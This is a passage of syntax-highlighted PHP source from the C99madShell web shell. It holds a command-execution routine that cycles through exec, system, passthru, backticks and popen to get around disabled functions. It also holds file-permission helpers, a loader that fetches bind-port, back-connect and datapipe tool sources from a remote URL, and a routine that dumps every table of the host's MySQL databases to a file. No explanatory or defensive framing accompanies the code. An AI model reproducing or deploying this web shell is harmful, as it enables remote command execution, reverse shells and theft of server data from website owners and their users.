<span class="s2">  if (is_callable(&quot;</span><span class="nb">exec</span><span class="s2">&quot;) and !in_array(&quot;</span><span class="nb">exec</span><span class="s2">&quot;,</span><span class="si">$disablefunc</span><span class="s2">)) {exec(</span><span class="si">$cmd</span><span class="s2">,</span><span class="si">$result</span><span class="s2">); </span><span class="si">$result</span><span class="s2"> = join(&quot;</span>
<span class="s2">&quot;,</span><span class="si">$result</span><span class="s2">);}</span>
<span class="s2">  elseif ((</span><span class="si">$result</span><span class="s2"> = `</span><span class="si">$cmd</span><span class="s2">`) !== FALSE) {}</span>
<span class="s2">  elseif (is_callable(&quot;</span><span class="nb">system</span><span class="s2">&quot;) and !in_array(&quot;</span><span class="nb">system</span><span class="s2">&quot;,</span><span class="si">$disablefunc</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  elseif (is_callable(&quot;</span><span class="nb">passthru</span><span class="s2">&quot;) and !in_array(&quot;</span><span class="nb">passthru</span><span class="s2">&quot;,</span><span class="si">$disablefunc</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  elseif (is_resource(</span><span class="si">$fp</span><span class="s2"> = popen(</span><span class="si">$cmd</span><span class="s2">,&quot;</span><span class="nx">r</span><span class="s2">&quot;)))</span>
<span class="s2">  {</span>
<span class="s2">   </span><span class="si">$result</span><span class="s2"> = &quot;&quot;;</span>
<span class="s2">   while(!feof(</span><span class="si">$fp</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$result</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">1024</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   pclose(</span><span class="si">$fp</span><span class="s2">);</span>
<span class="s2">  }</span>
<span class="s2"> }</span>
<span class="s2"> return </span><span class="si">$result</span><span class="s2">;</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">tabsort</span><span class="s2">&quot;)) {function tabsort(</span><span class="si">$a</span><span class="s2">,</span><span class="si">$b</span><span class="s2">) {global </span><span class="si">$v</span><span class="s2">; return strnatcmp(</span><span class="si">$a[$v]</span><span class="s2">, </span><span class="si">$b[$v]</span><span class="s2">);}}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">view_perms</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function view_perms(</span><span class="si">$mode</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if ((</span><span class="si">$mode</span><span class="s2"> &amp; 0xC000) === 0xC000) </span><span class="si">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x4000) === 0x4000) </span><span class="si">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0xA000) === 0xA000) </span><span class="si">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x8000) === 0x8000) </span><span class="si">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x6000) === 0x6000) </span><span class="si">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x2000) === 0x2000) </span><span class="si">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x1000) === 0x1000) </span><span class="si">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> else </span><span class="si">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>

<span class="s2"> </span><span class="si">$owner[&quot;read&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00400)?&quot;</span><span class="nx">r</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$owner[&quot;write&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00200)?&quot;</span><span class="nx">w</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$owner[&quot;execute&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00100)?&quot;</span><span class="nx">x</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$group[&quot;read&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00040)?&quot;</span><span class="nx">r</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$group[&quot;write&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00020)?&quot;</span><span class="nx">w</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$group[&quot;execute&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00010)?&quot;</span><span class="nx">x</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$world[&quot;read&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00004)?&quot;</span><span class="nx">r</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$world[&quot;write&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00002)? &quot;</span><span class="nx">w</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$world[&quot;execute&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00001)?&quot;</span><span class="nx">x</span><span class="s2">&quot;:&quot;</span><span class="o">-</span><span class="s2">&quot;;</span>

<span class="s2"> if (</span><span class="si">$mode</span><span class="s2"> &amp; 0x800) </span><span class="si">{</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (</span><span class="si">$mode</span><span class="s2"> &amp; 0x400) </span><span class="si">{</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (</span><span class="si">$mode</span><span class="s2"> &amp; 0x200) </span><span class="si">{</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;t&quot;</span><span class="o">:</span><span class="s2">&quot;T&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>

<span class="s2"> return </span><span class="si">$type</span><span class="s2">.join(&quot;&quot;,</span><span class="si">$owner</span><span class="s2">).join(&quot;&quot;,</span><span class="si">$group</span><span class="s2">).join(&quot;&quot;,</span><span class="si">$world</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nb">posix_getpwuid</span><span class="s2">&quot;) and !in_array(&quot;</span><span class="nb">posix_getpwuid</span><span class="s2">&quot;,</span><span class="si">$disablefunc</span><span class="s2">)) {function posix_getpwuid(</span><span class="si">$uid</span><span class="s2">) {return FALSE;}}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nb">posix_getgrgid</span><span class="s2">&quot;) and !in_array(&quot;</span><span class="nb">posix_getgrgid</span><span class="s2">&quot;,</span><span class="si">$disablefunc</span><span class="s2">)) {function posix_getgrgid(</span><span class="si">$gid</span><span class="s2">) {return FALSE;}}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nb">posix_kill</span><span class="s2">&quot;) and !in_array(&quot;</span><span class="nb">posix_kill</span><span class="s2">&quot;,</span><span class="si">$disablefunc</span><span class="s2">)) {function posix_kill(</span><span class="si">$gid</span><span class="s2">) {return FALSE;}}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">parse_perms</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function parse_perms(</span><span class="si">$mode</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if ((</span><span class="si">$mode</span><span class="s2"> &amp; 0xC000) === 0xC000) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x4000) === 0x4000) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0xA000) === 0xA000) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x8000) === 0x8000) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x6000) === 0x6000) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x2000) === 0x2000) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif ((</span><span class="si">$mode</span><span class="s2"> &amp; 0x1000) === 0x1000) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> else </span><span class="si">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> </span><span class="si">$o[&quot;r&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00400) &amp;gt; 0; </span><span class="si">$o[&quot;w&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00200) &amp;gt; 0; </span><span class="si">$o[&quot;x&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00100) &amp;gt; 0;</span>
<span class="s2"> </span><span class="si">$g[&quot;r&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00040) &amp;gt; 0; </span><span class="si">$g[&quot;w&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00020) &amp;gt; 0; </span><span class="si">$g[&quot;x&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00010) &amp;gt; 0;</span>
<span class="s2"> </span><span class="si">$w[&quot;r&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00004) &amp;gt; 0; </span><span class="si">$w[&quot;w&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00002) &amp;gt; 0; </span><span class="si">$w[&quot;x&quot;]</span><span class="s2"> = (</span><span class="si">$mode</span><span class="s2"> &amp; 00001) &amp;gt; 0;</span>
<span class="s2"> return array(&quot;</span><span class="nx">t</span><span class="s2">&quot;=&amp;gt;</span><span class="si">$t</span><span class="s2">,&quot;</span><span class="nx">o</span><span class="s2">&quot;=&amp;gt;</span><span class="si">$o</span><span class="s2">,&quot;</span><span class="nx">g</span><span class="s2">&quot;=&amp;gt;</span><span class="si">$g</span><span class="s2">,&quot;</span><span class="nx">w</span><span class="s2">&quot;=&amp;gt;</span><span class="si">$w</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">parsesort</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function parsesort(</span><span class="si">$sort</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$one</span><span class="s2"> = intval(</span><span class="si">$sort</span><span class="s2">);</span>
<span class="s2"> </span><span class="si">$second</span><span class="s2"> = substr(</span><span class="si">$sort</span><span class="s2">,-1);</span>
<span class="s2"> if (</span><span class="si">$second</span><span class="s2"> != &quot;</span><span class="nx">d</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$second</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> return array(</span><span class="si">$one</span><span class="s2">,</span><span class="si">$second</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">view_perms_color</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function view_perms_color(</span><span class="si">$o</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if (!is_readable(</span><span class="si">$o</span><span class="s2">)) {return &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.view_perms(fileperms(</span><span class="si">$o</span><span class="s2">)).&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
<span class="s2"> elseif (!is_writable(</span><span class="si">$o</span><span class="s2">)) {return &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">white</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.view_perms(fileperms(</span><span class="si">$o</span><span class="s2">)).&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
<span class="s2"> else {return &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.view_perms(fileperms(</span><span class="si">$o</span><span class="s2">)).&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">c99getsource</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function c99getsource(</span><span class="si">$fn</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> global </span><span class="si">$c99sh_sourcesurl</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$array</span><span class="s2"> = array(</span>
<span class="s2">  &quot;</span><span class="nx">c99sh_bindport</span><span class="o">.</span><span class="nx">pl</span><span class="s2">&quot; =&amp;gt; &quot;</span><span class="nx">c99sh_bindport_pl</span><span class="o">.</span><span class="nx">txt</span><span class="s2">&quot;,</span>
<span class="s2">  &quot;</span><span class="nx">c99sh_bindport</span><span class="o">.</span><span class="nx">c</span><span class="s2">&quot; =&amp;gt; &quot;</span><span class="nx">c99sh_bindport_c</span><span class="o">.</span><span class="nx">txt</span><span class="s2">&quot;,</span>
<span class="s2">  &quot;</span><span class="nx">c99sh_backconn</span><span class="o">.</span><span class="nx">pl</span><span class="s2">&quot; =&amp;gt; &quot;</span><span class="nx">c99sh_backconn_pl</span><span class="o">.</span><span class="nx">txt</span><span class="s2">&quot;,</span>
<span class="s2">  &quot;</span><span class="nx">c99sh_backconn</span><span class="o">.</span><span class="nx">c</span><span class="s2">&quot; =&amp;gt; &quot;</span><span class="nx">c99sh_backconn_c</span><span class="o">.</span><span class="nx">txt</span><span class="s2">&quot;,</span>
<span class="s2">  &quot;</span><span class="nx">c99sh_datapipe</span><span class="o">.</span><span class="nx">pl</span><span class="s2">&quot; =&amp;gt; &quot;</span><span class="nx">c99sh_datapipe_pl</span><span class="o">.</span><span class="nx">txt</span><span class="s2">&quot;,</span>
<span class="s2">  &quot;</span><span class="nx">c99sh_datapipe</span><span class="o">.</span><span class="nx">c</span><span class="s2">&quot; =&amp;gt; &quot;</span><span class="nx">c99sh_datapipe_c</span><span class="o">.</span><span class="nx">txt</span><span class="s2">&quot;,</span>
<span class="s2"> );</span>
<span class="s2"> </span><span class="si">$name</span><span class="s2"> = </span><span class="si">$array[$fn]</span><span class="s2">;</span>
<span class="s2"> if (</span><span class="si">$name</span><span class="s2">) {return file_get_contents(</span><span class="si">$c99sh_sourcesurl</span><span class="s2">.</span><span class="si">$name</span><span class="s2">);}</span>
<span class="s2"> else {return FALSE;}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">mysql_dump</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function mysql_dump(</span><span class="si">$set</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> global </span><span class="si">$shver</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$sock</span><span class="s2"> = </span><span class="si">$set[&quot;sock&quot;]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$db</span><span class="s2"> = </span><span class="si">$set[&quot;db&quot;]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$print</span><span class="s2"> = </span><span class="si">$set[&quot;print&quot;]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$nl2br</span><span class="s2"> = </span><span class="si">$set[&quot;nl2br&quot;]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$file</span><span class="s2"> = </span><span class="si">$set[&quot;file&quot;]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$add_drop</span><span class="s2"> = </span><span class="si">$set[&quot;add_drop&quot;]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$tabs</span><span class="s2"> = </span><span class="si">$set[&quot;tabs&quot;]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$onlytabs</span><span class="s2"> = </span><span class="si">$set[&quot;onlytabs&quot;]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$ret</span><span class="s2"> = array();</span>
<span class="s2"> </span><span class="si">$ret[&quot;err&quot;]</span><span class="s2"> = array();</span>
<span class="s2"> if (!is_resource(</span><span class="si">$sock</span><span class="s2">)) {echo(&quot;</span><span class="nx">Error</span><span class="o">:</span> <span class="nx">\</span><span class="nv">$sock</span> <span class="nx">is</span> <span class="k">not</span> <span class="nx">valid</span> <span class="nx">resource</span><span class="o">.</span><span class="s2">&quot;);}</span>
<span class="s2"> if (empty(</span><span class="si">$db</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$db</span> <span class="o">=</span> <span class="s2">&quot;db&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (empty(</span><span class="si">$print</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$print</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (empty(</span><span class="si">$nl2br</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$nl2br</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (empty(</span><span class="si">$add_drop</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (empty(</span><span class="si">$file</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2">  </span><span class="si">$file</span><span class="s2"> = </span><span class="si">$tmpdir</span><span class="s2">.&quot;</span><span class="nx">dump_</span><span class="s2">&quot;.getenv(&quot;</span><span class="nx">SERVER_NAME</span><span class="s2">&quot;).&quot;</span><span class="nx">_</span><span class="s2">&quot;.</span><span class="si">$db</span><span class="s2">.&quot;</span><span class="nx">_</span><span class="s2">&quot;.date(&quot;</span><span class="nx">d</span><span class="o">-</span><span class="nx">m</span><span class="o">-</span><span class="nx">Y</span><span class="o">-</span><span class="nx">H</span><span class="o">-</span><span class="nx">i</span><span class="o">-</span><span class="nx">s</span><span class="s2">&quot;).&quot;</span><span class="o">.</span><span class="nx">sql</span><span class="s2">&quot;;</span>
<span class="s2"> }</span>
<span class="s2"> if (!is_array(</span><span class="si">$tabs</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$tabs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (empty(</span><span class="si">$add_drop</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (sizeof(</span><span class="si">$tabs</span><span class="s2">) == 0)</span>
<span class="s2"> {</span>
<span class="s2">  // retrive tables-list</span>
<span class="s2">  </span><span class="si">$res</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SHOW</span> <span class="nx">TABLES</span> <span class="nx">FROM</span> <span class="s2">&quot;.</span><span class="si">$db</span><span class="s2">, </span><span class="si">$sock</span><span class="s2">);</span>
<span class="s2">  if (mysql_num_rows(</span><span class="si">$res</span><span class="s2">) &amp;gt; 0) {while (</span><span class="si">$row</span><span class="s2"> = mysql_fetch_row(</span><span class="si">$res</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$tabs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="si">}</span><span class="s2">}</span>
<span class="s2"> }</span>
<span class="s2"> </span><span class="si">$out</span><span class="s2"> = &quot;</span><span class="c1"># Dumped by C99madShell.SQL v. &quot;.$shver.&quot;</span>
<span class="c1"># Home page: http://securityprobe.net</span>
<span class="c1">#</span>
<span class="c1"># Host settings:</span>
<span class="c1"># MySQL version: (&quot;.mysql_get_server_info().&quot;) running on &quot;.getenv(&quot;SERVER_ADDR&quot;).&quot; (&quot;.getenv(&quot;SERVER_NAME&quot;).&quot;)&quot;.&quot;</span>
<span class="c1"># Date: &quot;.date(&quot;d.m.Y H:i:s&quot;).&quot;</span>
<span class="c1"># DB: \&quot;&quot;.$db.&quot;\&quot;</span>
<span class="c1">#---------------------------------------------------------</span>
<span class="s2">&quot;;</span>
<span class="s2"> </span><span class="si">$c</span><span class="s2"> = count(</span><span class="si">$onlytabs</span><span class="s2">);</span>
<span class="s2"> foreach(</span><span class="si">$tabs</span><span class="s2"> as </span><span class="si">$tab</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2">  if ((in_array(</span><span class="si">$tab</span><span class="s2">,</span><span class="si">$onlytabs</span><span class="s2">)) or (!</span><span class="si">$c</span><span class="s2">))</span>
<span class="s2">  {</span>
<span class="s2">   if (</span><span class="si">$add_drop</span><span class="s2">) </span><span class="si">{</span><span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;DROP TABLE IF EXISTS `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`;</span>
<span class="s2">&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   // recieve query for create table structure</span>
<span class="s2">   </span><span class="si">$res</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SHOW</span> <span class="nx">CREATE</span> <span class="nx">TABLE</span> <span class="sb">`&quot;.$tab.&quot;`</span><span class="s2">&quot;, </span><span class="si">$sock</span><span class="s2">);</span>
<span class="s2">   if (!</span><span class="si">$res</span><span class="s2">) </span><span class="si">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   else</span>
<span class="s2">   {</span>
<span class="s2">    </span><span class="si">$row</span><span class="s2"> = mysql_fetch_row(</span><span class="si">$res</span><span class="s2">);</span>
<span class="s2">    </span><span class="si">$out</span><span class="s2"> .= </span><span class="si">$row[&quot;1&quot;]</span><span class="s2">.&quot;</span><span class="p">;</span>

<span class="s2">&quot;;</span>
<span class="s2">    // recieve table variables</span>
<span class="s2">    </span><span class="si">$res</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="sb">`$tab`</span><span class="s2">&quot;, </span><span class="si">$sock</span><span class="s2">);</span>
<span class="s2">    if (mysql_num_rows(</span><span class="si">$res</span><span class="s2">) &amp;gt; 0)</span>
<span class="s2">    {</span>
<span class="s2">     while (</span><span class="si">$row</span><span class="s2"> = mysql_fetch_assoc(</span><span class="si">$res</span><span class="s2">))</span>
<span class="s2">     {</span>
<span class="s2">      </span><span class="si">$keys</span><span class="s2"> = implode(&quot;</span><span class="sb">`, `</span><span class="s2">&quot;, array_keys(</span><span class="si">$row</span><span class="s2">));</span>
<span class="s2">      </span><span class="si">$values</span><span class="s2"> = array_values(</span><span class="si">$row</span><span class="s2">);</span>
<span class="s2">      foreach(</span><span class="si">$values</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">) </span><span class="si">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">      </span><span class="si">$values</span><span class="s2"> = implode(&quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot;, </span><span class="si">$values</span><span class="s2">);</span>
<span class="s2">      </span><span class="si">$sql</span><span class="s2"> = &quot;</span><span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="sb">`$tab`</span><span class="p">(</span><span class="sb">`&quot;.$keys.&quot;`</span><span class="p">)</span> <span class="nx">VALUES</span> <span class="p">(</span><span class="s1">&#39;&quot;.$values.&quot;&#39;</span><span class="p">);</span>
<span class="s2">&quot;;</span>
<span class="s2">      </span><span class="si">$out</span><span class="s2"> .= </span><span class="si">$sql</span><span class="s2">;</span>
<span class="s2">     }</span>
<span class="s2">    }</span>
<span class="s2">   }</span>
<span class="s2">  }</span>
<span class="s2"> }</span>
